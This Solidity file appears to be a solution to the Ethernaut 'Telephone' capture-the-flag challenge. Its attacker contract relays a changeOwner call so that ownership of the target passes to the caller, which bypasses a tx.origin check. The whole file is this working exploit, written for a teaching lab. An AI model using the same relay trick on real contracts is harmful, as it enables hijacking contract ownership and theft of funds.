// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
  ITelephone public challenge;

  constructor(address challengeAddress) {
    challenge = ITelephone(challengeAddress);
  }

  function jugarTelefonoDescompuesto() external {
    challenge.changeOwner(msg.sender);
  }
}